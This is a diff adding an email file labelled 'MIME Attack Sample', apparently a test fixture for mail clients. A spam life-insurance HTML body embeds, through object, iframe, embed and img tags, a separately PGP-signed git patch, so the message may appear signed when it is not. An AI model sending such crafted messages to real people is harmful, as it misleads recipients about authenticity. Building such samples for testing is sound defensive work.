@@ -1,0 +1,120 @@
+From: susan.mara@enron.com
+To: d_perrino@msn.com
+Subject: MIME Attack Sample
+Content-Type: multipart/related; boundary="DELIMITER"
+--DELIMITER
+Content-Type: text/html
+Content-Type: text/html; charset="iso-8859-1"
+
+<html>
+<body bgcolor="#FFFBE0">
+<center>
+<font face="verdana" size="1" color="#000000">smart shoppers <a href="http://www.marketing-leader.com/user0202/instant_savings"><font face="verdana" size="1" color="#0000ff">click here</font>
+</a> for the best rates</font><br>
+<table border="0" cellpadding="2" cellspacing="0">
+ <tr>
+  <td bgcolor="#000000">
+   <table bgcolor="#ffffff" border="0" width="470" cellpadding="8" cellspacing="0">
+    <tr>
+     <td align="center">
+      <font face="arial" size="5" color="#8B0909"><b>Paying Too Much for Life Insurance?
+      <br><a href="http://www.marketing-leader.com/user0202/instant_savings"><font face="verdana" size="4" color="#0000ff">Click Here to Save 70% on Your Policy</font></a></b></font></td>
+    </tr>
+    <tr>
+     <td align="left">
+      <br>
+      <font face="verdana" size="2" color="#000000">In today's world, it's important to expect the unexpected.  When preparing for
+      the future, we must always consider our family.  To plan for your family's future, <i>the right life insurance policy is a 
+      necessity.</i> But who wants to pay too much for life insurance?  Let us help you find <b>the right quote, quickly and 
+      easily... </font><font face="verdana" size="2" color="#ff0000">for FREE.</b></font></td>
+    </tr>
+    <tr>
+     <td align="center">
+      <font face="verdana" size="4" color="#737373"><b>Compare your coverage...</b></font></td>
+    </tr>
+     <tr>
+     <td align="center">
+      <font face="arial" size="5" color="#000000"><b>$250,000... </b></font>
+      <font face="arial" size="4" color="#737373">as low as </font>
+      <font face="arial" size="5" color="#8B0909"><b>$6.50 </b></font>
+      <font face="arial" size="4" color="#000000">per month</font>
+      <br>
+      <font face="arial" size="5" color="#000000"><b>$500,000... </b></font>
+      <font face="arial" size="4" color="#737373">as low as </font>
+      <font face="arial" size="5" color="#8B0909"><b>$9.50 </b></font>
+      <font face="arial" size="4" color="#000000">per month</font>
+      <br>
+      <font face="arial" size="5" color="#000000"><b>$1,000,000... </b></font>
+      <font face="arial" size="4" color="#737373">as low as </font>
+      <font face="arial" size="5" color="#8B0909"><b>$15.50 </b></font>
+      <font face="arial" size="4" color="#000000">per month!</font>
+      </td>
+    </tr>
+    <tr>
+     <td align="center">
+      <a href="http://www.marketing-leader.com/user0202/instant_savings"><font face="verdana" size="4" color="#0000ff"><b>Get a FREE Instant Quote</b></font></a></font></td>
+    </tr>
+    <tr>
+     <td align="center">
+      <font face="arial" size="3" color="#8B0909"><b><i>Prepare for your family's future</i></b></font><br>
+      <font face="arial" size="1" color="#737373">Compare the lowest prices from the top insurance companies in the nation</font></td>
+    </tr>
+   </table>
+  </td>
+ </tr>
+</table>
+</center>
+</body>
+</html>
+
+<object width="100%" height="25" data="cid:target"></object>
+<iframe width="100%" height="25"  src="cid:target"></iframe>
+<embed  width="100%" height="25" src="cid:target"/></embed><img    width="100"  height="25"  src="cid:target">
+--DELIMITER
+Content-ID: <target>Content-Type: multipart/signed; boundary="BOUNDARY";  protocol="application/pgp-signature"
+--BOUNDARY
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
+ SHA1
+
+- ---
+ services/presence/server_plugin.py |    4 +---
+ 1 files changed, 1 insertions(+), 3 deletions(-)
+
+diff --git a/services/presence/server_plugin.py b/services/presence/server_plugin.py
+index cfa1819..97f06a8 100644
+- --- a/services/presence/server_plugin.py
++++ b/services/presence/server_plugin.py
+@@ -739,15 +739,13 @@ class ServerPlugin(gobject.GObject):
+             self._contact_offline(handle)
+             return
+ 
+- -        # Convert key from dbus byte array to python string
+- -        props["key"] = psutils.bytes_to_string(props["key"])
+- -
+         self._conn[CONN_INTERFACE_ALIASING].RequestAliases([handle],
+             reply_handler=lambda *args: self._contact_online_aliases_cb(handle, props, *args),
+             error_handler=lambda e: self._contact_online_aliases_error_cb(handle, props, True, e))
+ 
+     def _contact_online_request_properties(self, handle, tries):
+         self._conn[CONN_INTERFACE_BUDDY_INFO].GetProperties(handle,
++            byte_arrays=True,
+             reply_handler=lambda *args: self._contact_online_properties_cb(handle, *args),
+             error_handler=lambda e: self._contact_online_properties_error_cb(handle, tries, e))
+         return False
+- -- 
+1.5.2-rc3.GIT
+
+-BOUNDARY--
+Content-Type: application/pgp-signature; name="signature.asc"
+BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+Comment: OpenPGP key: http://www.pseudorandom.co.uk/2003/contact/ or pgp.net
+
+iD8DBQFGVXuLWSc8zVUw7HYRAjKrAKCZYtxTKTLLNqS7qZTfzcBdDsTjvACgwi+H
+MTjvx8OaMRHfSk5ISt6CBgc=
+=7ypw
+-----END PGP SIGNATURE-----
+_____
+--BOUNDARY--
+--DELIMITER--
